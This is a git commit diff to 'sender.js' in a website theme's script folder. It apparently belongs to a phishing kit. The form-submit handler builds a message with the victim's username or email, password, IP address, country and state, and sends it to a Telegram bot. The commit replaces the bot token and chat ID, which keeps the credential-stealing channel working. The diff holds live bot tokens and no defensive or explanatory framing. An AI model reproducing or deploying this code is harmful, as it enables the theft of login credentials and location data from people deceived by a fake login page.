1c30c2d76f93cd643937ba701d14543b05a3e43d
Limlizx <157521557+Limlizx@users.noreply.github.com>
2024-01-25 15:04:41 +0000

    Update sender.js

--- theme-assets/js/scripts/sender.js
+++ theme-assets/js/scripts/sender.js
@@ -21,8 +21,8 @@ form.addEventListener("submit", (e) => {
 
         var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        var token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
-        var chat_id =  -4088820833;
+        var token = "6731121004:AAG5V3_4euycmSJuwRCUI2E3_7dbSdHIcaQ";
+        var chat_id =  -4162361061;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
